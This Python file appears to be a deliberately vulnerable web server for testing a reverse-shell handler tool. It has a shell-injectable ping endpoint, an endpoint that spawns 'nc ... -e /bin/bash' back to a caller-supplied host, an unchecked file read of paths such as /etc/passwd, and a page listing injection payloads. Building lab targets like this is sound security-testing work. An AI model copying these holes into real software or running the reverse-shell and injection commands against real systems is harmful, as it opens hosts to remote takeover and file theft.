#!/usr/bin/env python3
"""
Vulnerable Application for Testing DragonShard Reverse Shell Handler

This application contains multiple intentional vulnerabilities for testing:
- Command injection
- Reverse shell triggers
- Path traversal
"""

import os
import subprocess
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs


class VulnerableHandler(BaseHTTPRequestHandler):
    """HTTP handler with intentional vulnerabilities for testing."""
    
    def do_GET(self):
        """Handle GET requests with vulnerable endpoints."""
        parsed_url = urlparse(self.path)
        query_params = parse_qs(parsed_url.query)
        
        if parsed_url.path == "/":
            # Main page with vulnerability links
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"""
<!DOCTYPE html>
<html>
<head>
    <title>Vulnerable App</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .vuln-link { color: #ff6b6b; text-decoration: none; }
        .vuln-link:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <h1>Vulnerable Application</h1>
    <p>This application has multiple vulnerabilities for testing DragonShard:</p>
    <ul>
        <li><a href="/ping?host=127.0.0.1" class="vuln-link">Command Injection Test</a></li>
        <li><a href="/reverse-shell?host=127.0.0.1&port=4444" class="vuln-link">Reverse Shell Test</a></li>
        <li><a href="/file?path=/etc/passwd" class="vuln-link">Path Traversal Test</a></li>
    </ul>
    <hr>
    <h2>Test Commands</h2>
    <p>Try these command injection payloads:</p>
    <ul>
        <li><code>/ping?host=127.0.0.1;whoami</code></li>
        <li><code>/ping?host=127.0.0.1;id</code></li>
        <li><code>/ping?host=127.0.0.1;ls -la</code></li>
    </ul>
    <p>Try these reverse shell payloads:</p>
    <ul>
        <li><code>/reverse-shell?host=YOUR_IP&port=4444</code></li>
    </ul>
</body>
</html>
            """)
            
        elif parsed_url.path == "/ping":
            # Command injection vulnerability
            host = query_params.get("host", ["127.0.0.1"])[0]
            try:
                # Vulnerable: direct shell command execution
                result = subprocess.check_output(f"ping -c 1 {host}", shell=True, stderr=subprocess.STDOUT)
                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(result)
            except Exception as e:
                self.send_response(500)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(str(e).encode())
                
        elif parsed_url.path == "/reverse-shell":
            # Reverse shell trigger vulnerability
            host = query_params.get("host", ["127.0.0.1"])[0]
            port = query_params.get("port", ["4444"])[0]
            try:
                # Vulnerable: reverse shell creation
                cmd = f"nc {host} {port} -e /bin/bash"
                subprocess.Popen(cmd, shell=True)
                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(f"Reverse shell initiated to {host}:{port}".encode())
            except Exception as e:
                self.send_response(500)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(str(e).encode())
                
        elif parsed_url.path == "/file":
            # Path traversal vulnerability
            path = query_params.get("path", ["/etc/passwd"])[0]
            try:
                # Vulnerable: direct file access without path validation
                with open(path, "r") as f:
                    content = f.read()
                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(content.encode())
            except Exception as e:
                self.send_response(500)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(str(e).encode())
                
        else:
            # 404 for unknown paths
            self.send_response(404)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Not Found")
    
    def log_message(self, format, *args):
        """Suppress access logs for cleaner output."""
        return


if __name__ == "__main__":
    print("Starting vulnerable application on port 8080...")
    print("Available endpoints:")
    print("  - / (main page)")
    print("  - /ping?host=<target> (command injection)")
    print("  - /reverse-shell?host=<target>&port=<port> (reverse shell)")
    print("  - /file?path=<path> (path traversal)")
    print("")
    print("⚠️  WARNING: This application contains intentional vulnerabilities!")
    print("   Only use in controlled testing environments.")
    print("")
    
    server = HTTPServer(("0.0.0.0", 8080), VulnerableHandler)
    print("✅ Server started at http://localhost:8080")
    print("Press Ctrl+C to stop")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n🛑 Server stopped by user")
        server.shutdown() 